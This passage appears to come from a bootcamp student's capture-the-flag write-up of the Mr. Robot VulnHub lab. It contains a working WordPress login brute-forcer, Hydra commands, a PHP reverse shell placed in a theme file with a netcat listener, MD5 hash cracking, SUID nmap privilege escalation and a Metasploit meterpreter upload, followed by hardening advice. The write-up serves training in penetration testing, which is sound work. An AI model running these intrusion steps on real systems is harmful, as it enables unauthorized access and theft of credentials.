password):\n    # Create a dictionary to hold the form data for the login attempt\n    payload = {\n        'log': username,          # The username\n        'pwd': password,          # The password\n        'wp-submit': 'Log In',    # The value of the submit button\n        'redirect_to': '/wp-admin/',  # The URL to redirect to after login\n        'testcookie': '1'         # A value indicating whether cookies are enabled\n    }\n    # Send a POST request to the login URL with the form data\n    response = session.post(url, data=payload)\n    return response  # Return the response object\n\n# Start a new session to maintain cookies and certain parameters across requests\nsession = requests.Session()\n\n# Iterate over each valid username and password combination\nfor username in valid_usernames:\n    for password in passwords:\n        # Attempt to log in with the current username and password\n        response = attempt_login(session, username, password)\n        # Check if the response text does not contain the message indicating an incorrect password for the username\n        if \"The password you entered for the username\" not in response.text:\n            # If the message is not found, it means the login attempt was successful\n            print(f\"Success with username: {username} and password: {password}\")\n            break  # Exit the inner loop once a successful login is found\n        else:\n            # If the message is found, it means the password was incorrect for the given username\n            print(f\"Failed with username: {username} and password: {password}\")\n</code></pre>"},{"location":"challenge_5/#video-password","title":"Video password","text":"Your browser does not support the video tag.  <p>Success with username: elliot and password: ER28-0652</p> <p>username: elliot (usernames script) password: ER28-0652 (password script)</p> <ul> <li>Testing the form with the hacked credentials</li> </ul> <p></p> <p></p>"},{"location":"challenge_5/#option-2-hydra","title":"Option 2 Hydra","text":""},{"location":"challenge_5/#overview","title":"Overview","text":"<p>Brute-forcing a WordPress login involves two main steps: identifying valid usernames and then brute-forcing passwords for those usernames. Hydra, a powerful and versatile password-cracking tool, can be used to perform these tasks efficiently.</p>"},{"location":"challenge_5/#identifying-valid-usernames","title":"Identifying valid usernames","text":"<pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ hydra -L fsocity_sorted_unique.dic -p invalidpassword 192.168.1.226 http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:F=Invalid username\"\n\nHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-25 13:23:15\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task\n[DATA] attacking http-post-form://192.168.1.226:80/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:F=Invalid username\n[STATUS] 3665.00 tries/min, 3665 tries in 00:01h, 7787 to do in 00:03h, 16 active\n[80][http-post-form] host: 192.168.1.226   login: ELLIOT   password: invalidpassword\n[80][http-post-form] host: 192.168.1.226   login: Elliot   password: invalidpassword\n[STATUS] 3643.00 tries/min, 7286 tries in 00:02h, 4166 to do in 00:02h, 16 active\n[80][http-post-form] host: 192.168.1.226   login: elliot   password: invalidpassword\n[STATUS] 3646.67 tries/min, 10940 tries in 00:03h, 512 to do in 00:01h, 16 active\n1 of 1 target successfully completed, 3 valid passwords found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-25 13:26:23\n</code></pre> <p>The usernames are: ELLIOT, Elliot, and elliot</p> <p>Explanation:</p> <ul> <li><code>-L fsocity_sorted_unique.dic</code>: Specifies the dictionary file containing potential usernames.</li> <li><code>-p invalidpassword</code>: Uses a known invalid password for all login attempts.</li> <li><code>192.168.1.226</code>: Target IP address of the WordPress site.</li> <li><code>http-post-form</code>: Specifies that the attack is on an HTTP form.<ul> <li><code>/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1</code>: Form parameters.</li> <li><code>F=Invalid username</code>: Indicates failure if \"Invalid username\" is found in the response.</li> </ul> </li> </ul>"},{"location":"challenge_5/#brute-force-passwords","title":"Brute Force Passwords","text":"<pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ hydra -L valid_usernames.txt -P fsocity_sorted_unique.dic 192.168.1.226 http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location\"\n\nHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-25 13:31:55\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 34356 login tries (l:3/p:11452), ~2148 tries per task\n[DATA] attacking http-post-form://192.168.1.226:80/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location\n[STATUS] 3492.00 tries/min, 3492 tries in 00:01h, 30864 to do in 00:09h, 16 active\n[80][http-post-form] host: 192.168.1.226   login: ELLIOT   password: ER28-0652\n[80][http-post-form] host: 192.168.1.226   login: Elliot   password: ER28-0652\n[STATUS] 8455.00 tries/min, 25365 tries in 00:03h, 8991 to do in 00:02h, 16 active\n[80][http-post-form] host: 192.168.1.226   login: elliot   password: ER28-0652\n1 of 1 target successfully completed, 3 valid passwords found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-25 13:35:22\n</code></pre> <p>Valid Usernames: ELLIOT, Elliot, elliot Valid Password: ER28-0652</p> <p>Explanation:</p> <ul> <li>Hydra Command: Initiates Hydra with specified parameters.</li> <li>Username List (-L): Uses valid_usernames.txt to get a list of usernames.</li> <li>Password List (-P): Uses fsocity_sorted_unique.dic to get a list of passwords.</li> <li>Target IP: Specifies the target IP address (192.168.1.226).</li> <li>HTTP POST Form: Specifies the details of the HTTP POST request.</li> <li>Form Path: /wp-login.php.<ul> <li>Form Data: Includes placeholders for usernames (^USER^) and passwords (^PASS^).</li> <li>Success Condition: A successful login is indicated by a \"Location\" header in the response.</li> </ul> </li> </ul>"},{"location":"challenge_5/#security","title":"Security","text":"<p>Recommendations for a WordPress Site:</p> <ul> <li>Enforce Strong Password Policies: Require users to create strong passwords that are not easily guessable.</li> <li>Limit Login Attempts: Implement a mechanism to limit login attempts to prevent brute force attacks.</li> <li>Use Two-Factor Authentication (2FA): Add an extra layer of security by requiring a second factor for authentication.</li> <li>Regularly Update WordPress and Plugins: Keep the WordPress core, themes, and plugins up-to-date to protect against known vulnerabilities.</li> <li>Monitor Login Attempts: Regularly monitor login attempts and block IP addresses with suspicious activity.</li> </ul> Please enable JavaScript to view the comments powered by Disqus. Previous: Step 4 Home \ud83c\udfe0 Next: Step 6"},{"location":"challenge_6/","title":"Step 6: Reverse Shell","text":""},{"location":"challenge_6/#step-6-reverse-shell","title":"Step 6: Reverse Shell","text":""},{"location":"challenge_6/#reverse-shell-via-wordpress","title":"Reverse Shell via WordPress","text":""},{"location":"challenge_6/#method-1-php-reverse-shell","title":"Method 1: PHP Reverse Shell","text":"<p>Uploading a Reverse Shell via WordPress</p> <ol> <li> <p>Log in to WordPress Admin:</p> <ul> <li>Go to http://192.168.1.226/wp-admin and log in using the credentials you have.</li> </ul> </li> <li> <p>Edit the Theme:</p> <ul> <li>Navigate to Appearance &gt; Theme Editor.</li> <li>Select the 404.php file or another template file that is likely to be executed.</li> </ul> </li> </ol> <p> 3. Insert the Reverse Shell Code:</p> <pre><code>- Insert a PHP reverse shell code into the 404.php file\n- `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php`\n</code></pre> <p> 4. Start a Netcat Listener:</p> <pre><code>- On the Kali machine, start a netcat listener:`nc -lvnp 4444`\n</code></pre> <p></p><pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 4444                     \nlistening on [any] 4444 ...\n</code></pre> 5. Trigger the Reverse Shell: <pre><code>- Visit the modified 404.php file in your browser to trigger the reverse shell.\n\n- `http://192.168.1.226/wp-content/themes/[Twenty-Fifteen]/404.php`\n</code></pre> <p></p><pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 4444                     \nlistening on [any] 4444 ...\nconnect to [192.168.1.223] from (UNKNOWN) [192.168.1.226] 59344\nLinux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n 18:54:06 up  1:38,  0 users,  load average: 0.00, 0.01, 0.05\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=1(daemon) gid=1(daemon) groups=1(daemon)\n/bin/sh: 0: can't access tty; job control turned off\n$ \n</code></pre> 6. Upgrade the Shell <pre><code>- Spawn a TTY Shell Using Python: `python -c 'import pty; pty.spawn(\"/bin/bash\")'`\n</code></pre> <ol> <li> <p>Exploring the System</p> <ul> <li>Navigate the File System</li> </ul> </li> </ol> <p></p><pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 4444                     \nlistening on [any] 4444 ...\nconnect to [192.168.1.223] from (UNKNOWN) [192.168.1.226] 59344\nLinux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n 18:54:06 up  1:38,  0 users,  load average: 0.00, 0.01, 0.05\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=1(daemon) gid=1(daemon) groups=1(daemon)\n/bin/sh: 0: can't access tty; job control turned off\n$ $ python -c 'import pty; pty.spawn(\"/bin/bash\")'\n/bin/sh: 1: $: not found\n$ $ /bin/sh -i\n/bin/sh: 2: $: not found\n$ python -c 'import pty; pty.spawn(\"/bin/bash\")'\ndaemon@linux:/$ cd /home\ncd /home\ndaemon@linux:/home$ ls -a\nls -a\n.  ..  robot\ndaemon@linux:/home$ cd robot\ncd robot\ndaemon@linux:/home/robot$ ls -a\nls -a\n.  ..  key-2-of-3.txt  password.raw-md5\ndaemon@linux:/home/robot$ \n</code></pre> 8. View the Content of key-2-of-3.txt <p></p><pre><code>daemon@linux:/home/robot$ cat key-2-of-3.txt\ncat key-2-of-3.txt\ncat: key-2-of-3.txt: Permission denied\ndaemon@linux:/home/robot$ sudo cat key-2-of-3.txt\nsudo cat key-2-of-3.txt\n[sudo] password for daemon: ER28-0652\n\nSorry, try again.\n[sudo] password for daemon: \n\nSorry, try again.\n[sudo] password for daemon: \n\nSorry, try again.\nsudo: 3 incorrect password attempts\ndaemon@linux:/home/robot$ \n</code></pre> 9. Switch Users <pre><code>daemon@linux:/home/robot$ su robot\nsu robot\nPassword: ER28-0652\n\nsu: Authentication failure\ndaemon@linux:/home/robot$\n</code></pre> <p>ER28-0652 did not work. <code>password.raw-md5</code> must be hacked.</p> <ol> <li>Crack <code>password.raw-md5</code></li> </ol> <p></p><pre><code>daemon@linux:/home/robot$ cat password.raw-md5\ncat password.raw-md5\nrobot:c3fcd3d76192e4007dfb496cca67e13b\n</code></pre> 11. Creating a Python script to crack the hash (on the kali VM) <p></p><pre><code>import hashlib\n\nhash_to_crack = \"c3fcd3d76192e4007dfb496cca67e13b\"\nwordlist_path = \"/usr/share/wordlists/rockyou.txt\"\n\nwith open(wordlist_path, \"r\", encoding=\"utf-8\", errors=\"ignore\") as file:\n    for word in file:\n        word = word.strip()\n        if hashlib.md5(word.encode()).hexdigest() == hash_to_crack:\n            print(f\"Password found: {word}\")\n            break\n    else:\n        print(\"Password not found in the wordlist.\")\n</code></pre> 12. Runing the python script <p></p><pre><code>\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ ls -l /usr/share/wordlists/rockyou.txt\n\n-rw-r--r-- 1 root root 139921507 May 12  2023 /usr/share/wordlists/rockyou.txt\n\n\u250c\u2500\u2500(hcoco1\u327fkali)-[~]\n\u2514\u2500$ python3 md5_crack.py                            \n\nPassword found: abcdefghijklmnopqrstuvwxyz\n</code></pre> 13. Switch (non root) Users and inspecting <code>key-2-of-3.txt</code> <p></p><pre><code>daemon@linux:/tmp/john-1.9.0-jumbo-1/run$ su robot\nsu robot\nPassword: abcdefghijklmnopqrstuvwxyz\n\nrobot@linux:/tmp/john-1.9.0-jumbo-1/run$ cd /home/robot\ncat key-2-of-3.txt\ncd /home/robot\nrobot@linux:~$ cat key-2-of-3.txt\n822c73956184f694993bede3eb39f959 # Flag 2 of 3 \u2714\ufe0f\n</code></pre> 14. Finding the last flag <code>key-3-of-3.txt</code> <pre><code>robot@linux:~$ sudo find / -name \"key-3-of-3.txt\" 2&gt;/dev/null\nsudo find / -name \"key-3-of-3.txt\" 2&gt;/dev/null\n[sudo] password for robot: abcdefghijklmnopqrstuvwxyz\n\nrobot@linux:~$ sudo find / -name \"key-3-of-3.txt\" 2&gt;/dev/null\nsudo find / -name \"key-3-of-3.txt\" 2&gt;/dev/null\n[sudo] password for robot: \n\n[sudo] password for robot: \n\n[sudo] password for robot: \n\nrobot@linux:~$ find / -name \"key-3-of-3.txt\" 2&gt;/dev/null\nfind / -name \"key-3-of-3.txt\" 2&gt;/dev/null\n\nrobot@linux:~$ \n</code></pre> <p>Since we couldn't directly access the third key (key-3-of-3.txt) with the permissions of the robot user, we needed to find a way to escalate your privileges to gain root access.</p> <p>15.Identifying Privilege Escalation Opportunities</p> <p></p><pre><code>robot@linux:~$ find / -perm -u=s -type f 2&gt;/dev/null\nfind / -perm -u=s -type f 2&gt;/dev/null\n/bin/ping\n/bin/umount\n/bin/mount\n/bin/ping6\n/bin/su\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/sudo\n/usr/local/bin/nmap\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper\n/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper\n/usr/lib/pt_chown\n</code></pre> 16. Identifying nmap with SUID Bit <code>/usr/local/bin/nmap</code>. <p>17.Exploiting nmap for Privilege Escalation </p><pre><code>robot@linux:~$ /usr/local/bin/nmap --interactive\n/usr/local/bin/nmap --interactive\nStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )\nWelcome to Interactive Mode -- press h &lt;enter&gt; for help\nnmap&gt; !sh\n!sh\n</code></pre> 18. Accessing the Third Key <pre><code># find / -name \"key-3-of-3.txt\" 2&gt;/dev/null\nfind / -name \"key-3-of-3.txt\" 2&gt;/dev/null\n/root/key-3-of-3.txt\n# cat /root/key-3-of-3.txt\ncat /root/key-3-of-3.txt\n04787ddef27c3dee1ee161b21670b4e4 # Flag 3 of 3 \u2714\ufe0f\n#\n</code></pre> <p>By finding a file with elevated privileges (in this case, nmap with the SUID bit set), we were able to exploit it to gain root access and ultimately access the key-3-of-3.txt file. This process of privilege escalation is a common technique in ethical hacking and penetration testing to demonstrate how a lower-privileged user can potentially gain unauthorized access to restricted information.</p>"},{"location":"challenge_6/#method-2-use-metasploit","title":"Method 2: Use Metasploit","text":"<ul> <li> <p>Using Metasploit to Gain a Reverse Shell</p> </li> <li> <p>Start Metasploit Framework:</p> </li> </ul> <p>Open your terminal and start Metasploit: <code>msfconsole</code></p> <ol> <li> <p>Search for WordPress Exploits: <code>search wordpress</code></p> </li> <li> <p>Select an Exploit Module: <code>use exploit/unix/webapp/wp_admin_shell_upload</code></p> </li> <li> <p>Set Required Options:</p> </li> </ol> <p>Set the target URL and login credentials for the WordPress admin: </p><pre><code>set RHOSTS 192.168.1.226\nset USERNAME elliot\nset PASSWORD ER28-0652\nset TARGETURI /\n</code></pre> 5. Set the Payload: <pre><code>set payload php/meterpreter/reverse_tcp\nset LHOST 192.168.1.223\nset LPORT 4444\n</code></pre> <ol> <li>Run the Exploit: <code>exploit</code></li> </ol> <p></p><pre><code>View the full module info with the info, or info -d command.\n\nmsf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set TARGETURI /\nTARGETURI =&gt; /\nmsf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set USERNAME elliot\nUSERNAME =&gt; elliot\nmsf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.1.223:4444 \n[*] Skipping WordPress check...\n[*] Authenticating with WordPress using elliot:ER28-0652...\n[+] Authenticated with WordPress\n[*] Preparing payload...\n[*] Uploading payload...\n[*] Acquired a plugin upload nonce: 561b3a4c73\n[*] Uploaded plugin lCXSKnpNHP\n[*] Executing the payload at /wp-content/plugins/lCXSKnpNHP/DXgKrelAug.php...\n[*] Sending stage (39927 bytes) to 192.168.1.226\n[*] Meterpreter session 3 opened (192.168.1.223:4444 -&gt; 192.168.1.226:59378) at 2024-06-25 18:56:54 -0400\n[!] This exploit may require manual cleanup of 'DXgKrelAug.php' on the target\n[!] This exploit may require manual cleanup of 'lCXSKnpNHP.php' on the target\n[!] This exploit may require manual cleanup of '../lCXSKnpNHP' on the target\n\nmeterpreter &gt; \n</code></pre> 7. Post-Exploitation. Get a shell: <code>meterpreter &gt; shell</code> 8. Upgrade to a Full Shell: <code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code> 9. Explore the File System <pre><code>cd /home/robot\nls -a\n</code></pre> 10. Read the Content of Key Files: <pre><code>cat key-2-of-3.txt\n</code></pre> 10. Identify Privilege Escalation Opportunities: <code>find / -perm -u=s -type f 2&gt;/dev/null</code> 11. Exploiting Nmap Interactive Mode: <code>/usr/local/bin/nmap</code> <p></p><pre><code>/usr/local/bin/nmap --interactive\n!sh\n</code></pre> 12. Find and Read the Final Key <pre><code>find / -name \"key-3-of-3.txt\" 2&gt;/dev/null\ncat /root/key-3-of-3.txt\n</code></pre> 13. Cleaning Up <pre><code>rm /wp-content/plugins/lCXSKnpNHP/DXgKrelAug.php\nrm -rf /wp-content/plugins/lCXSKnpNHP\n</code></pre> <pre><code>meterpreter &gt; shell\nProcess 6921 created.\nChannel 0 created.\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\n&lt;ps/wordpress/htdocs/wp-content/plugins/lCXSKnpNHP$ cd /home/robot\ncd /home/robot\ndaemon@linux:/home/robot$ ls -a\nls -a\n.  ..  key-2-of-3.txt  password.raw-md5\ndaemon@linux:/home/robot$ cat key-2-of-3.txt\ncat key-2-of-3.txt\ncat: key-2-of-3.txt: Permission denied\ndaemon@linux:/home/robot$ find / -perm -u=s -type f 2&gt;/dev/null\nfind / -perm -u=s -type f 2&gt;/dev/null\n/bin/ping\n/bin/umount\n/bin/mount\n/bin/ping6\n/bin/su\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/sudo\n/usr/local/bin/nmap\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper\n/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper\n/usr/lib/pt_chown\ndaemon@linux:/home/robot$ /usr/local/bin/nmap --interactive\n/usr/local/bin/nmap --interactive\n\nStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )\nWelcome to Interactive Mode -- press h &lt;enter&gt; for help\nnmap&gt; !sh\n!sh\ncat /home/robot/key-2-of-3.txt\n822c73956184f694993bede3eb39f959 # Flag 2 of 3 \u2714\ufe0f\n# find / -name \"key-3-of-3.txt\" 2&gt;/dev/null\nfind / -name \"key-3-of-3.txt\" 2&gt;/dev/null\n/root/key-3-of-3.txt\n# cat /root/key-3-of-3.txt\ncat /root/key-3-of-3.txt\n04787ddef27c3dee1ee161b21670b4e4 # Flag 3 of 3 \u2714\ufe0f\n# \n</code></pre> <p>I was be able to fully exploit the Mr. Robot VM, find all the hidden keys, and perform necessary post-exploitation tasks.</p> Please enable JavaScript to view the comments powered by Disqus. Previous: Step 5 Home \ud83c\udfe0 Next: Report"},{"location":"o-recommendations/","title":"Final Thoughts","text":""},{"location":"o-recommendations/#final-thoughts","title":"Final Thoughts","text":""},{"location":"o-recommendations/#conclusion-in-progress","title":"Conclusion (in progress)","text":""},{"location":"o-recommendations/#cyber-boot-camp-full-stack-academy","title":"Cyber Boot camp Full Stack Academy","text":"<p>The cyber bootcamp offered a comprehensive education in offensive and defensive cybersecurity strategies. On the offensive side, participants learned Red Team skills, including identifying and exploiting web vulnerabilities, executing social engineering attacks, and using tools like Metasploit for exploitation and credential collection. They also learned privilege escalation and lateral movement techniques, gaining a deep understanding of attackers' methods.</p> <p>On the defensive side, Blue Team training is designed to empower participants by focusing on strengthening systems against attacks. They learn to parse logs effectively, create Splunk visualizations, and conduct digital forensics to investigate and mitigate security incidents. This comprehensive approach equips them with the skills to identify, protect, detect, respond to, and recover from cyber threats, ensuring a solid defensive posture and instilling confidence in their abilities.</p> <p>In addition to Red and Blue Team training, the bootcamp emphasizes the versatility of Python programming for automating tasks, parsing logs, and analyzing data, enhancing overall cybersecurity proficiency. This emphasis on Python not only enhances their technical skills but also makes them adaptable and resourceful in the face of evolving cybersecurity challenges. The bootcamp also hones system administration skills with a focus on managing files, permissions, and applications in both Windows and Linux environments.</p> <p>Overall, the bootcamp's curriculum provided a balanced and rigorous education, equipping participants with the knowledge and skills to address real-world cybersecurity challenges from offensive and defensive perspectives effectively.</p>"},{"location":"o-recommendations/#mr-robot-report","title":"Mr. Robot Report","text":"<p>The structured methodology employed in this project for ethical hacking and securing systems on the Mr. Robot Virtual Machine has demonstrated the importance and effectiveness of penetration testing in identifying and mitigating vulnerabilities.</p> <p>The process began with setting up a controlled, isolated environment to ensure safe testing. Network scanning tools like Nmap provided a comprehensive map of the target network, identifying live hosts, open ports, and available services. This foundational step was crucial for subsequent phases.</p> <p>Enumeration with tools such as Gobuster and Wappalyzer allowed for the identification of directories and technologies used by the WordPress site, revealing critical insights into the target's infrastructure. Vulnerabilities were pinpointed using Nmap scripts and Nikto, uncovering outdated software versions and potential security issues like SQL injection and cross-site scripting.</p> <p>Brute-force attacks using Python scripts and Hydra exposed weak passwords and access points, emphasizing the need for robust authentication mechanisms. The project culminated in achieving a reverse shell via PHP scripts or Metasploit, illustrating how attackers can gain control over a system.</p> <p>The findings revealed several critical vulnerabilities, including outdated plugins and themes, missing security headers, and exposed sensitive directories. These weaknesses highlighted the necessity of regular updates, proper configuration management, and strict access controls.</p> <p>In conclusion, this project has reinforced the critical role of ethical hacking in maintaining secure systems. Penetration testing not only helps identify and address vulnerabilities but also underscores the importance of ongoing security maintenance. Ethical hacking and responsible disclosure are essential practices that contribute to the protection and resilience of digital systems.</p>"},{"location":"o-recommendations/#recomendations","title":"Recomendations","text":"<p>The findings from the Mr. Robot Vulnhub Virtual Machine assessment highlight several critical vulnerabilities that pose significant security risks. To mitigate these vulnerabilities and enhance the overall security posture, the following recommendations are proposed:</p> <ul> <li> <p>Update and Patch Management: Ensure that all software, including Apache HTTPD, WordPress, plugins, themes, and PHP, are regularly updated to the latest versions. Apply security patches promptly to address known vulnerabilities.</p> </li> <li> <p>Implement Security Headers and Update SSL/TLS Configurations: Configure appropriate security headers (e.g., Content Security Policy, X-Content-Type-Options) and update SSL/TLS settings to current best practices to protect against various web-based attacks.</p> </li> <li> <p>Regular Security Audits and Monitoring: Conduct regular security audits and vulnerability assessments to identify and remediate potential security issues. Implement continuous monitoring to detect and respond to security incidents promptly.</p> </li> <li> <p>Strengthen Authentication Mechanisms: Enforce strong password policies, including complex and unique passwords. Implement multi-factor authentication (MFA) to add a layer of security to user accounts.</p> </li> <li> <p>Restrict Access to Sensitive Directories and Files: Implement access controls to restrict unauthorized access to sensitive directories and files. Regularly review and update access permissions based on the principle of least privilege.</p> </li> <li> <p>Enhance Configuration Management: Review and improve server configurations to minimize exposure to security risks. Ensure that all configurations align with industry best practices and security guidelines.</p> </li> </ul> <p>By addressing these recommendations, organizations can significantly enhance their security posture, protect against potential exploits, and maintain a robust and secure environment for their systems and applications.</p> Previous: Step 6 Home \ud83c\udfe0 Next: Presentation"},{"location":"presentation/","title":"Presentation","text":""},{"location":"presentation/#presentation","title":"Presentation","text":""},{"location":"presentation/#youtube-video","title":"YouTube Video:","text":""},{"location":"presentation/#pdf-in-progress","title":"PDF: (In progress)","text":"Previous: Recomendations Home \ud83c\udfe0 Next: Report"},{"location":"report/","title":"Documenting","text":""},{"location":"report/#documenting","title":"Documenting","text":""},{"location":"report/#written-report-in-progress","title":"Written Report: (In progress)","text":"Please enable JavaScript to view the comments powered by Disqus. Previous: Presentation Home \ud83c\udfe0 Next: Videos"},{"location":"technologies/","title":"Technologies","text":""},{"location":"technologies/#technologies","title":"Technologies","text":"<ul> <li>URL: http://192.168.1.226 (Target Machine)</li> <li>CMS: WordPress</li> <li>Analytics: WordPress</li> <li>Font Scripts: Google Font API</li> <li>Programming Languages: PHP</li> <li>Databases: MySQL</li> </ul> <p>The <code>http-wordpress-enum</code> script provided information about the WordPress plugins and themes installed on the target site. The results indicate the presence of the following:</p>"},{"location":"technologies/#plugins","title":"Plugins:","text":"<ul> <li>Akismet</li> <li>Contact Form 7 (version 4.1)</li> <li>Jetpack (version 3.3.2)</li> <li>All-in-One SEO Pack</li> <li>Google Sitemap Generator (version 4.0.7.1)</li> <li>Google Analytics for WordPress (version 5.3.2)</li> <li>WPtouch (version 3.7.3)</li> <li>All-in-One WP Migration (version 2.0.4)</li> <li>WP Mail SMTP (version 0.9.5)</li> </ul>"},{"location":"technologies/#themes","title":"Themes:","text":"<ul> <li>Twentythirteen (version 1.6)</li> <li>Twentyfourteen (version 1.5)</li> <li>Twentyfifteen (version 1.3)</li> </ul>"},{"location":"technologies/#vulnerabilities","title":"Vulnerabilities","text":"<p>Nikto provided additional insights and potential security issues:</p> <p>SSL Info:</p> <ul> <li>Subject: /CN=www.example.com</li> <li>Issuer: /CN=www.example.com</li> <li>Ciphers: ECDHE-RSA-AES256-GCM-SHA384</li> </ul> <p>Server:</p> <ul> <li>Apache web server detected.</li> </ul> <p>Configuration Issues:</p> <ul> <li>Missing Strict-Transport-Security header.</li> <li>Missing X-Content-Type-Options header.</li> <li>Retrieved x-powered-by header: PHP/5.5.29.</li> <li>Apache mod_negotiation enabled with MultiViews.</li> <li>Content-Encoding header set to deflate, potentially vulnerable to BREACH attack.</li> </ul> <p>Interesting Directories/Files:</p> <ul> <li>/admin/</li> <li>/image/</li> <li>/wp-links-opml.php: Reveals the installed WordPress version.</li> <li>/license.txt: May identify site software.</li> <li>/admin/index.html: Admin login page/section found.</li> <li>Multiple WordPress login pages (/wp-login.php, /wp-admin/wp-login.php, etc.)</li> <li>wp-config.php file found, which contains credentials.</li> </ul> Home \ud83c\udfe0"},{"location":"videos/","title":"Videos","text":""},{"location":"videos/#videos","title":"Videos","text":"Web Penetration Testing Videos: Home \ud83c\udfe0"}]}